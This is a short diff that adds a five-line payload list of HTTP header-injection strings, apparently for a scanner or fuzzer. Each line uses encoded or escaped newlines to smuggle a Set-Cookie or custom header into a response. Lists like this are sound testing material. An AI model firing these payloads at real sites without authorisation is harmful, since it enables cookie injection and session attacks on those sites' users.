@@ -1,0 +1,5 @@
+%0d%0aSet-Cookie:wexec=1
+%0aSet-Cookie:wexec=1
+\r\nSet-Cookie:wexec=1
+%0d%0aX-Injected:%20wexec
+%23%0aSet-Cookie:wexec=1
